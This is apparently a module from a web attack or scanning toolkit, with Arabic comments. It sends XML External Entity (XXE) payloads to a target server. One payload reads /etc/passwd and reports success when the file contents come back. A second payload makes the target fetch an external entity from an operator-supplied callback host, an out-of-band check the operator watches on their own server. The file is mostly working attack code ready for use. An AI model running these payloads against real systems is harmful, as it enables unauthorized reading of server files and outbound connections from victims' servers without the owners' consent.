# xxe.py — حقن XXE
import random, urllib.parse
from core.registry import module
from core.http import req

XXE = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>'''

XXE2 = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % ext SYSTEM "CALLBACK">
%ext;]><root/>'''

@module("xxe", "web", "حقن XXE")
def run(base, a, R):
    st, _, b = req(base + "/", method="POST", data=XXE,
                    headers={"Content-Type": "application/xml"})
    if st == 200 and ("root:" in b.decode("utf-8","replace")):
        R.vuln("XXE ناجح: /etc/passwd مقروء عبر XML!")
    else:
        R.info(f"اختبار XXE أساسي -> HTTP {st} (قد يتطلب نقطة XML محددة)")
    ck = getattr(a, "callback", None)
    if ck:
        body = XXE2.replace("CALLBACK", ck.rstrip("/") + "/xxe/" + str(random.randint(1000,9999)))
        req(base + "/", method="POST", data=body, headers={"Content-Type": "application/xml"})
        R.warn("أرسلنا XXE خارجي — راقب خادمك للاتصال")
